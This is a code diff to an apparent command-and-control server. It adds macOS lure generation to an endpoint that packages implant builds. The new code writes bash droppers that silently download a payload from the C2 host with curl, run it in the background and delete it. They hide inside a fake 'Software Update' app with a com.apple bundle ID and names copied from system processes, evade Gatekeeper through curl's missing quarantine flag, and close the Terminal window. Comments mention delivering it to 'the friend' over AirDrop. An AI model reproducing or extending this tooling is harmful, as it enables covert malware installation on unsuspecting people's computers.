@@ -1,6 +1,9 @@
 package api
 
 import (
+	"archive/tar"
+	"bytes"
+	"compress/gzip"
 	"context"
 	"fmt"
 	"math/rand"
@@ -12,17 +15,17 @@ import (
 	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
 )
 
-// handleDeliverBuild generates a LOLBin wrapper for a completed EXE build.
+// handleDeliverBuild generates a platform-appropriate LOLBin wrapper for a completed build.
 //
-// GET /api/v1/builds/{id}/deliver?format=hta|ps1
+// GET /api/v1/builds/{id}/deliver?format=hta|ps1|js|app|sh
 func (g *gateway) handleDeliverBuild(w http.ResponseWriter, r *http.Request) {
 	buildID := r.PathValue("id")
 	format := r.URL.Query().Get("format")
 	if format == "" {
 		format = "hta"
 	}
-	if format != "hta" && format != "ps1" && format != "js" {
-		writeError(w, http.StatusBadRequest, "format must be hta, ps1, or js")
+	if format != "hta" && format != "ps1" && format != "js" && format != "app" && format != "sh" {
+		writeError(w, http.StatusBadRequest, "format must be hta, ps1, js, app, or sh")
 		return
 	}
 
@@ -43,19 +46,33 @@ func (g *gateway) handleDeliverBuild(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	isMac := targetOS == "macos"
+
+	if isMac && (format == "hta" || format == "ps1" || format == "js") {
+		writeError(w, http.StatusBadRequest, "use app or sh format for macOS builds")
+		return
+	}
+	if !isMac && (format == "app" || format == "sh") {
+		writeError(w, http.StatusBadRequest, "app/sh format is only for macOS builds")
+		return
+	}
+
 	c2Host := "127.0.0.1"
+	c2Port := 4443
 	if listenerID != nil && *listenerID != "" {
 		var bindHost, callbackHost string
 		var port int
 		if err := db.Pool.QueryRow(ctx,
 			`SELECT bind_host, COALESCE(callback_host,''), bind_port FROM listeners WHERE id = $1`, *listenerID,
 		).Scan(&bindHost, &callbackHost, &port); err == nil {
-			_ = port
 			switch {
 			case callbackHost != "":
 				c2Host = callbackHost
 			case bindHost != "" && bindHost != "0.0.0.0":
 				c2Host = bindHost
+			}
+			if port > 0 {
+				c2Port = port
 			}
 		}
 	}
@@ -64,37 +81,63 @@ func (g *gateway) handleDeliverBuild(w http.ResponseWriter, r *http.Request) {
 	if targetOS == "windows" {
 		ext = ".exe"
 	}
-	httpAddr := os.Getenv("DM_HTTP_ADDR")
-	if httpAddr == "" {
-		httpAddr = ":8080"
+
+	var downloadURL string
+	if isMac {
+		// macOS lure fetches over the C2 HTTPS port (accessible via CF tunnel).
+		// Port 8080 is internal-only; the C2 port is what's reachable externally.
+		downloadURL = fmt.Sprintf("https://%s:%d/download/%s", c2Host, c2Port, buildID)
+	} else {
+		httpAddr := os.Getenv("DM_HTTP_ADDR")
+		if httpAddr == "" {
+			httpAddr = ":8080"
+		}
+		_, httpPort, _ := splitHostPort(httpAddr)
+		if httpPort == "" {
+			httpPort = strings.TrimPrefix(httpAddr, ":")
+		}
+		downloadURL = fmt.Sprintf("http://%s:%s/download/%s%s", c2Host, httpPort, buildID, ext)
 	}
-	httpPort := strings.TrimPrefix(httpAddr, ":")
-	downloadURL := fmt.Sprintf("http://%s:%s/download/%s%s", c2Host, httpPort, buildID, ext)
 
-	legitNames := []string{"RuntimeBroker", "svchost", "WmiPrvSE", "dllhost", "conhost"}
-	tempName := legitNames[rand.Intn(len(legitNames))] + fmt.Sprintf("%04d", rand.Intn(10000))
+	var tempName string
+	if isMac {
+		names := []string{"nsurlsessiond", "softwareupdated", "mdmclient", "trustd", "secd"}
+		tempName = names[rand.Intn(len(names))] + fmt.Sprintf("%04d", rand.Intn(10000))
+	} else {
+		names := []string{"RuntimeBroker", "svchost", "WmiPrvSE", "dllhost", "conhost"}
+		tempName = names[rand.Intn(len(names))] + fmt.Sprintf("%04d", rand.Intn(10000))
+	}
 
-	var body, filename, contentType string
+	var bodyBytes []byte
+	var filename, contentType string
 	switch format {
 	case "hta":
-		body = buildHTA(downloadURL, tempName)
+		bodyBytes = []byte(buildHTA(downloadURL, tempName))
 		filename = "update.hta"
 		contentType = "application/hta"
 	case "ps1":
-		body = buildPS1(downloadURL, tempName)
+		bodyBytes = []byte(buildPS1(downloadURL, tempName))
 		filename = "update.ps1"
 		contentType = "text/plain"
 	case "js":
-		body = buildJS(downloadURL, tempName)
+		bodyBytes = []byte(buildJS(downloadURL, tempName))
 		filename = "update.js"
 		contentType = "text/javascript"
+	case "app":
+		bodyBytes = buildApp(downloadURL, tempName)
+		filename = "SoftwareUpdate.app.tar.gz"
+		contentType = "application/gzip"
+	case "sh":
+		bodyBytes = []byte(buildSH(downloadURL, tempName))
+		filename = "update.command"
+		contentType = "text/plain"
 	}
 
 	w.Header().Set("Content-Type", contentType)
 	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
-	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(body)))
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(bodyBytes)))
 	w.WriteHeader(http.StatusOK)
-	w.Write([]byte(body)) //nolint:errcheck
+	w.Write(bodyBytes) //nolint:errcheck
 }
 
 func buildHTA(downloadURL, tempName string) string {
@@ -160,4 +203,97 @@ func buildPS1(downloadURL, tempName string) string {
 		"$si.FileName=$p\n"+
 		"$si.WindowStyle='Hidden'\n"+
 		"[System.Diagnostics.Process]::Start($si)|Out-Null") + "\n"
+}
+
+// buildApp generates a tar.gz containing a macOS .app bundle with LSBackgroundOnly=true.
+// tar.gz preserves Unix execute permissions reliably (unlike ZIP on macOS).
+// After extracting (double-click), the friend double-clicks SoftwareUpdate.app — silent, no Terminal.
+func buildApp(downloadURL, tempName string) []byte {
+	dl := strings.ReplaceAll(downloadURL, "'", `'\''`)
+	nm := strings.ReplaceAll(tempName, "'", `'\''`)
+
+	script := "#!/bin/bash\n" +
+		"exec 2>/dev/null\n" +
+		"_t=$(mktemp -t '" + nm + "')\n" +
+		"curl -fsSL '" + dl + "' -o \"$_t\"\n" +
+		"chmod +x \"$_t\"\n" +
+		"nohup \"$_t\" >/dev/null 2>&1 &\n" +
+		"disown\n" +
+		"(sleep 2 && rm -f \"$_t\") &\n" +
+		"exit 0\n"
+
+	plist := `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>CFBundleExecutable</key>
+	<string>` + tempName + `</string>
+	<key>CFBundleIdentifier</key>
+	<string>com.apple.` + tempName + `</string>
+	<key>CFBundleName</key>
+	<string>Software Update</string>
+	<key>CFBundleVersion</key>
+	<string>1.0</string>
+	<key>CFBundlePackageType</key>
+	<string>APPL</string>
+	<key>LSBackgroundOnly</key>
+	<true/>
+</dict>
+</plist>
+`
+
+	now := time.Now()
+	var buf bytes.Buffer
+	gz := gzip.NewWriter(&buf)
+	tw := tar.NewWriter(gz)
+
+	addEntry := func(name string, mode int64, content []byte) {
+		tw.WriteHeader(&tar.Header{ //nolint:errcheck
+			Name:     name,
+			Mode:     mode,
+			Size:     int64(len(content)),
+			Typeflag: tar.TypeReg,
+			ModTime:  now,
+		})
+		tw.Write(content) //nolint:errcheck
+	}
+
+	addDir := func(name string) {
+		tw.WriteHeader(&tar.Header{ //nolint:errcheck
+			Name:     name,
+			Mode:     0755,
+			Typeflag: tar.TypeDir,
+			ModTime:  now,
+		})
+	}
+
+	addDir("SoftwareUpdate.app/")
+	addDir("SoftwareUpdate.app/Contents/")
+	addDir("SoftwareUpdate.app/Contents/MacOS/")
+	addEntry("SoftwareUpdate.app/Contents/Info.plist", 0644, []byte(plist))
+	addEntry("SoftwareUpdate.app/Contents/MacOS/"+tempName, 0755, []byte(script))
+
+	tw.Close()  //nolint:errcheck
+	gz.Close()  //nolint:errcheck
+	return buf.Bytes()
+}
+
+// buildSH generates a .command shell script (Terminal-based fallback).
+// Use when AirDrop isn't an option — Terminal flashes briefly then closes.
+func buildSH(downloadURL, tempName string) string {
+	dl := strings.ReplaceAll(downloadURL, "'", `'\''`)
+	nm := strings.ReplaceAll(tempName, "'", `'\''`)
+	// curl downloads without com.apple.quarantine (only browsers set it),
+	// so Gatekeeper does not block the downloaded binary.
+	return "#!/bin/bash\n" +
+		"exec 2>/dev/null\n" +
+		"_t=$(mktemp -t '" + nm + "')\n" +
+		"curl -fsSL '" + dl + "' -o \"$_t\"\n" +
+		"chmod +x \"$_t\"\n" +
+		"nohup \"$_t\" >/dev/null 2>&1 &\n" +
+		"disown\n" +
+		"(sleep 2 && rm -f \"$_t\") &\n" +
+		"disown\n" +
+		"osascript -e 'delay 1.5' -e 'tell application \"Terminal\" to close first window' 2>/dev/null &\n" +
+		"exit 0\n"
 }
